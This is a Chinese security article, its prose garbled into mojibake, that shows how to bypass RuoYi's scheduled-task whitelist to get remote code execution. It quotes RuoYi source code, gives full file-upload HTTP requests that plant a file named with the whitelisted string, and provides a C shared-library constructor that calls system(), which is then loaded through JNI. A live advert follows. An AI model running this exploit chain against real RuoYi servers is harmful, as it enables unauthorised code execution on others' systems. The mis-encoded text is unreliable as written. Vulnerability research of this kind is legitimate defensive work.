ç„¶åä¸â½¤JOB_ERROR_STR è¿™ä¸ªç±»â¾¥â¾¯çš„ ä»mvn install å ä»å…¶ä»–åŒ…ä¸‹â¾¯å»å¯»æ‰¾å¯åˆ©â½¤çš„ç±»ä¸‹çš„â½…æ³•å°±â¾  
  
éœ€è¦æ»¡â¾œä»¥ä¸‹æ¡ä»¶**æ–¹æ³•å‚æ•°è§£æï¼ˆgetMethodParamsï¼‰**  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicfaiczmiblgoMyQR5LvsibCNqdibZyYdjicDuHWZzpFyjwiatUpCoojtSI9yw/640?wx_fmt=png&from=appmsg "")  

```
publicstaticList<Object[]> getMethodParams(StringÂ invokeTarget) Â 
{ Â 
StringÂ methodStr = StringUtils.substringBetween(invokeTarget,Â &#34;(&#34;,Â &#34;)&#34;); Â 
ifÂ (StringUtils.isEmpty(methodStr)) Â 
Â  Â  { Â 
returnnull; Â 
Â  Â  } Â 
String[] methodParams = methodStr.split(&#34;,(?=([^\&#34;']*[\&#34;'][^\&#34;']*[\&#34;'])*[^\&#34;']*$)&#34;); Â 
List<Object[]> classs =Â newÂ LinkedList<>(); Â 
forÂ (intÂ i =Â 0; i < methodParams.length; i++) Â 
Â  Â  { Â 
StringÂ str = StringUtils.trimToEmpty(methodParams[i]); Â 
// Stringå­—ç¬¦ä¸²ç±»å‹ï¼Œä»¥'æˆ–&#34;å¼€å¤´ Â 
ifÂ (StringUtils.startsWithAny(str,Â &#34;'&#34;,Â &#34;\&#34;&#34;)) Â 
Â  Â  Â  Â  { Â 
Â  Â  Â  Â  Â  Â  classs.add(newObject[] { StringUtils.substring(str,Â 1, str.length() -Â 1),Â String.classÂ }); Â 
Â  Â  Â  Â  } Â 
// booleanå¸ƒå°”ç±»å‹ï¼Œç­‰äºtrueæˆ–è€…false Â 
elseifÂ (&#34;true&#34;.equalsIgnoreCase(str) ||Â &#34;false&#34;.equalsIgnoreCase(str)) Â 
Â  Â  Â  Â  { Â 
Â  Â  Â  Â  Â  Â  classs.add(newObject[] {Â Boolean.valueOf(str),Â Boolean.classÂ }); Â 
Â  Â  Â  Â  } Â 
// longé•¿æ•´å½¢ï¼Œä»¥Lç»“å°¾ Â 
elseifÂ (StringUtils.endsWith(str,Â &#34;L&#34;)) Â 
Â  Â  Â  Â  { Â  Â  Â  Â  Â  Â classs.add(newObject[] { Long.valueOf(StringUtils.substring(str,Â 0, str.length() -Â 1)), Long.classÂ }); Â 
Â  Â  Â  Â  } Â 
// doubleæµ®ç‚¹ç±»å‹ï¼Œä»¥Dç»“å°¾ Â 
elseifÂ (StringUtils.endsWith(str,Â &#34;D&#34;)) Â 
Â  Â  Â  Â  { Â 
Â  Â  Â  Â  Â  Â  classs.add(newObject[] {Â Double.valueOf(StringUtils.substring(str,Â 0, str.length() -Â 1)),Â Double.classÂ }); Â 
Â  Â  Â  Â  } Â 
// å…¶ä»–ç±»å‹å½’ç±»ä¸ºæ•´å½¢ Â 
else
Â  Â  Â  Â  { Â 
Â  Â  Â  Â  Â  Â  classs.add(newObject[] {Â Integer.valueOf(str),Â Integer.classÂ }); Â 
Â  Â  Â  Â  } Â 
Â  Â  } Â 
returnÂ classs; Â 
}

```

- **é™åˆ¶**  
ï¼šå‚æ•°ç±»å‹è¢«å¼ºåˆ¶çº¦æŸä¸ºåŸºæœ¬ç±»å‹ï¼Œæ— æ³•ä¼ é€’å¤æ‚å¯¹è±¡ã€‚  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoickpQb2VqulW9aymIjpXniaQ4HoibCoEBHEHus3ibmyFH9mCvsu637L2d9A/640?wx_fmt=png&from=appmsg "")  

```
/** Â 
Â * æ‰§è¡Œæ–¹æ³• Â 
Â * Â 
Â *Â @paramÂ sysJob ç³»ç»Ÿä»»åŠ¡ Â 
Â */
publicstaticvoidÂ invokeMethod(SysJob sysJob) throwsÂ Exception
{ Â 
StringÂ invokeTarget = sysJob.getInvokeTarget(); Â 
StringÂ beanName = getBeanName(invokeTarget); Â 
StringÂ methodName = getMethodName(invokeTarget); Â 
List<Object[]> methodParams = getMethodParams(invokeTarget); Â 

ifÂ (!isValidClassName(beanName)) Â 
Â  Â  { Â 
ObjectÂ bean = SpringUtils.getBean(beanName); Â 
Â  Â  Â  Â  invokeMethod(bean, methodName, methodParams); Â 
Â  Â  } Â 
else
Â  Â  { Â 
ObjectÂ bean =Â Class.forName(beanName).getDeclaredConstructor().newInstance(); Â 
Â  Â  Â  Â  invokeMethod(bean, methodName, methodParams); Â 
Â  Â  } Â 
}

```

  
ä¼ é€’çš„å‚æ•°åªèƒ½æ˜¯å…¶ä¸­çš„è¿™äº›ç±»å‹ é€šè¿‡ , è¿›â¾åˆ†å‰²ã€‚substringBetweenè·å–çš„æ˜¯() â¾¥â¾¯ ä¸èƒ½ç»§ç»­åŒ…å« )äº†ä¼šæˆªæ–­  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicRwvCYrTicwqzyMcnTL4laMY32boqDzXEFqSr6AiaQH1eic5jMIos3KiaibQ/640?wx_fmt=png&from=appmsg "")  

```
publicstaticStringÂ substringBetween(finalStringÂ str,Â finalStringÂ open,Â finalStringÂ close) { Â 
ifÂ (!ObjectUtils.allNotNull(str, open, close)) { Â 
returnnull; Â 
Â  Â  } Â 
finalintÂ start = str.indexOf(open); Â 
ifÂ (start != INDEX_NOT_FOUND) { Â 
finalintÂ end = str.indexOf(close, start + open.length()); Â 
ifÂ (end != INDEX_NOT_FOUND) { Â 
returnÂ str.substring(start + open.length(), end); Â 
Â  Â  Â  Â  } Â 
Â  Â  } Â 
returnnull; Â 
}

```

  
é‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥å»æ‰¾String å¯æ§åˆ°sink çš„ç±»å°±å¯ä»¥äº†ã€‚  
  
è¿™â¾¥åå°„çš„æ—¶å€™è¿˜éœ€è¦æ³¨æ„ éœ€è¦æ»¡â¾œ å­˜åœ¨â¼€ä¸ªå‚æ„é€  ä¸”éƒ½æ˜¯publicçš„  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicKBlYBzubFgmyoHOTG4u4XyDpcW7zVCUGiac15Lbcic6MMB1wV4piaPibug/640?wx_fmt=png&from=appmsg "")  

```
ObjectÂ bean =Â Class.forName(beanName).getDeclaredConstructor().newInstance();

```

#### è®¡åˆ’ä»»åŠ¡åˆ†æ  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic62hjTYygzGEfdVuvlibiaSgacNu4ib4GJB5Fec2ArQZXXbcGic8CJYGG5Q/640?wx_fmt=png&from=appmsg "")  
  
æ ¹æ®æäº¤æ•°æ®åŒ…é”å®šåç«¯è·¯ç”±  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7SvFKOYBHibeeIeJBjDKAdId5QOmficsSvzelz2Rkt69TaiawaDo1u3qg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic4ibl3eMJ7z5ncW5smAOGicOiagbhJO1nc2SYHSkaVSCsH0NQSajSSUOkQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
è°ƒè¯•çœ‹ä¸€ä¸‹å…·ä½“åšäº†ä»€ä¹ˆ  
  
å‰å‡ ä¸ªéƒ½æ˜¯åœ¨åˆ¤æ–­æ˜¯å¦æœ‰åŒ…å«rmi ldap httpå…³é”®è¯,ç¦æ­¢å¯¹è¿™äº›åè®®è¿›è¡Œè°ƒç”¨  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicIuPtrUVicicjcWQ7XDfSiaqd5ySlkhAYZeSqNG4s2hGeibvUoZbbkWMucw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
è¿˜åˆ¤æ–­äº†æ˜¯å¦æœ‰ä¸€äº›é»‘åå•ä¸­çš„ç±»  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicibibs6uRuxXk7cokgCz2Tibe7nn27vnHePaKD9QlzLpITOGWZe4egc1GA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
è¿›å…¥ç™½åå•çš„åˆ¤æ–­  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic4T6mXa72Fpa0XSzIsUMiaQs3p3LG0QT2hhiao3xVtwgwrSicbKzKIsqOg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
æå–å‡ºè°ƒç”¨çš„ç±»åï¼Œåˆ¤æ–­å…¶ä¸­æ˜¯å¦åŒ…å«ç™½åå•å­—ç¬¦ä¸²  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicQnADjW4dtC1C8QIqT619qus1LBrJI2mcD8LGdhtsSkNoMnZRpxNXaw/640?wx_fmt=png&from=appmsg "")  
  
ç™½åå•å­—ç¬¦ä¸²ä¸ºcom.ruoyi.quartz.task  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicchDlrvRzcObSnbnthibDKpLTUmOcvqEsZvjicoQrwTEwg5gVBn552PxA/640?wx_fmt=png&from=appmsg "")  
  
æ³¨æ„è¿™é‡Œæ˜¯ç”¨æ­£åˆ™å»åŒ¹é…çš„ï¼Œæ‰€ä»¥è¯¥å­—ç¬¦ä¸²åœ¨ä»»æ„ä½ç½®éƒ½å¯ä»¥ï¼Œæ‰€ä»¥å­˜åœ¨å¯ä»¥ç»•è¿‡çš„å¯èƒ½  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicA0dvZDHWvgGia39JFamJNkfciatAJHFxz4ToLYbF3c9aqpInPclFVIeQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
åç»­å°±ä¼šè¿›å…¥æ­£å¸¸çš„jä¿å­˜è®¡åˆ’ä»»åŠ¡æµç¨‹  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicmeoF1zOzDL9TMwDRicfD7h4zle1SIqLfFl8CC1gr4ceWMuGkhSiaqsyQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
å½“å¯åŠ¨ä»»åŠ¡æ—¶ï¼Œä¼šè°ƒç”¨æ–¹æ³•  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoic7pVmXQvcesibWaALAicNj8EXM3WGGsfI2J8Jt86NHgBcywU85m8Pdh1g/640?wx_fmt=png&from=appmsg "")  
  
è·å–éœ€è¦è°ƒç”¨çš„ç±»åæ–¹æ³•åå‚æ•°å€¼  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicHFMu1kaUpLfKMtEVIzD0n3v63zp5XcY8k2x9yia6T71XVQf2eBh8xvw/640?wx_fmt=png&from=appmsg "")  
  
åœ¨è·å–æ–¹æ³•å‚æ•°æ—¶è¿›è¡Œäº†å¤„ç†ï¼Œåªå…è®¸ä¸ºå­—ç¬¦ä¸²/å¸ƒå°”/é•¿æ•´/æµ®ç‚¹/æ•´å½¢ï¼Œæ— æ³•ä¼ é€’ç±»å¯¹è±¡  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicOPmW0B78zibv3AU6lwVoW7qQsJ8gX79GGqr1XRGxSOL8r6jEF9lxYaA/640?wx_fmt=png&from=appmsg "")  
  
æ¥ç€ä¼šå®ä¾‹åŒ–è¯¥ç±»ï¼Œåå°„è°ƒç”¨å…¶æ–¹æ³•  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicCnXpYJjIVHNumCeqmp6xaL77Yx8No9icVYQicUIOE0Eib66W8gSRAAibFA/640?wx_fmt=png&from=appmsg "")  
  
è¯¥æ–¹æ³•ä¸ºpublicä¿®é¥°  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicHTWHmHj1roFsCibe61sbMsMO5pdkFylqxJmicSaB7wuDOcyW52mHPoicA/640?wx_fmt=png&from=appmsg "")  
  
æˆ‘ä»¬æƒ³è¦åˆ©ç”¨éœ€è¦è¾¾æˆçš„æ˜¯  
- ä½¿ç”¨çš„ç±»ä¸åœ¨é»‘åå•ä¸­  
  
- è¦å­˜åœ¨com.ruoyi.quartz.taskå­—ç¬¦ä¸²  
  
- ä¸å¯ä»¥ä½¿ç”¨rmi ldap httpåè®®  
  
#### æ–‡ä»¶ä¸Šä¼   
  
è€Œåœ¨ruoyiä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicDotcPS5y97YT2lyhonibic5VrxODRJ72WyP0t34cbkcHUgvnrXvl81bw/640?wx_fmt=png&from=appmsg "")  
  
æˆ‘ä»¬å¯ä»¥éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶çœ‹çœ‹  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicAqKHsoXpLJVMY8GEkcyA6JP69mAVtd3Wk0cpNG0G6XoW0bZfUyutXg/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicZH83CB98pOnzcicwAWLbvrcJoaUoyTe0THeWQOA0mjtRuVBbCnoXplw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªåå­—åŒ…å«com.ruoyi.quartz.taskå­—ç¬¦ä¸²çš„æ–‡ä»¶  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicUSxhkCR9ZUvia7Fzznic1Z37HOFibQklIm6NUOdOur965gGKp5wGuicPOA/640?wx_fmt=png&from=appmsg "")  
## æ¼æ´å¤ç°  
  
åœ¨javaä¸­å­˜åœ¨ä¸€ç§æœºåˆ¶å«åšJNIï¼Œå¯ä»¥é€šè¿‡åŠ è½½å¤–éƒ¨é“¾æ¥åº“ï¼Œä»è€Œæ‰§è¡Œå…¶ä¸­çš„<font style="color:rgba(0, 0, 0, 0.85);">æ„é€ å‡½æ•°</font>  
  
è€Œcom.sun.glass.utils.NativeLibLoaderçš„loadLibraryæ–¹æ³•å°±å¯ä»¥å»åŠ è½½é“¾æ¥åº“ï¼Œä¹Ÿæ˜¯publicä¿®é¥°  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicY1pNhZI03DcytfCNcXOMV2gldwck00kIy1rY1ZdgrZl39jOtWpNZPw/640?wx_fmt=png&from=appmsg "")  

```
POST /common/upload HTTP/1.1
Host:Â 10.40.107.67
Upgrade-Insecure-Requests:Â 1
User-Agent: Mozilla/5.0Â (Macintosh; Intel Mac OS XÂ 10_15_7) AppleWebKit/537.36Â (KHTML, like Gecko) Chrome/135.0.0.0Â Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1c
x-forwarded-for: 127.0.0.1
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Content-Length: 167

--00content0boundary00
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;com.ruoyi.quartz.task.txt&#34;
Content-Type: image/jpg

success
--00content0boundary00--

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3Ndvoicia6bEM5Wyrmm3KBlC1TiaicucSoicorh2hQv1wlzVhom40cE1PzDDEd8bA/640?wx_fmt=png&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicrCJ4EqANqJVicnpW8Cic4uHS3sHR2PV79YMU9KHj4H2AW8Y8oJvpAmAQ/640?wx_fmt=png&from=appmsg "")  

```
cat calc.cÂ 

#include <stdlib.h>
__attribute__((constructor))
staticvoidÂ run() {
system(&#34;open -a Calculator&#34;);
}

```


```
POST /common/upload HTTP/1.1
Host:Â 10.40.107.67
Upgrade-Insecure-Requests:Â 1
User-Agent: Mozilla/5.0Â (Macintosh; Intel Mac OS XÂ 10_15_7) AppleWebKit/537.36Â (KHTML, like Gecko) Chrome/135.0.0.0Â Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=b414f17a-7363-47d9-b164-3d0532a09b1c
x-forwarded-for: 127.0.0.1
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Content-Length: 167

--00content0boundary00
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;com.ruoyi.quartz.task.txt&#34;
Content-Type: image/jpg

äºŒè¿›åˆ¶æ¶æ„ä»£ç 
--00content0boundary00--

```

  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicdAPw6F0qkic9Qg1ZqsxOgzT1qY1wJPHPrD6HuC7oBjgthoclY2tPiaHA/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
  
  
æ³¨æ„ä»–ä¼šè‡ªåŠ¨åœ¨åé¢æ·»åŠ dylibç­‰åç¼€ï¼Œåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­å¯èƒ½æœ‰ä¸åŒçš„åç¼€ï¼Œå¹¶ä¸”è¦æ³¨æ„æ¶æ„é—®é¢˜  
  
æ–‡ç« ä½œè€…ï¼šå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºï¼ˆ  
Â Locks_ï¼‰  
  
æ–‡ç« æ¥æºï¼š  
https://forum.butian.net/share/4328  
  
å¦‚æœ‰ä¾µæƒè¯·è”ç³»åˆ é™¤  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/jVk423I423fpuYotTS5CuGN2LiaOD8C9JehkdRxGIbazQicjkfHucXQaSiaGlErIVZYB0AoF7ZjeIA1J8gfR1yRuw/640?from=appmsg "")  
  
å¹¿å‘Šæ—¶é—´  
  
  
ã€ç½‘å®‰å…è´¹å…¬å¼€è¯¾ã€‘  
  
é»‘å®¢æ”»å‡»æ‘„åƒå¤´æŠ€æœ¯å¤§æ­ç§˜ï¼  
  
ğŸ‘‰  
6æœˆ16æ—¥æ™š 20:00 åœ¨çº¿ç›´æ’­  
  
é€Ÿæ¥è§£é”é»‘å®¢è§†è§’çš„ç‰©è”ç½‘å®‰å…¨æ”»é˜²ï¼  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoiculRiac1lI13l7nYibpf4hUHUZic7xHjtgZxCr57zS9rmUdIibmiampgyv0A/640?wx_fmt=gif&from=appmsg "")  
  
æ‰«ç å…è´¹é¢„çº¦ç›´æ’­  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/CIfRhFLmt75ORicoHqDib36uxo2avCSt1IygpKs8hbLXHPFTKNruZqXjT5ularnGACoasRCS5qq3U1DvOHn8uAjA/640?from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/UkV8WB2qYAkb8xu0jnBTwkWNiat3NdvoicyLtFNc9pP5xQ0QfR21ibicZkYJPA5IHbPe60GicodAovVLopIZLpU7iblA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAkibSLtx2MRia79mst2UzCvnzKria9oBcehVeC9xF1dSq5A5I8DzHtUR06xmNRqTX1ic1bqodSyr9jMvA/640?wx_fmt=png&from=appmsg "")  
  
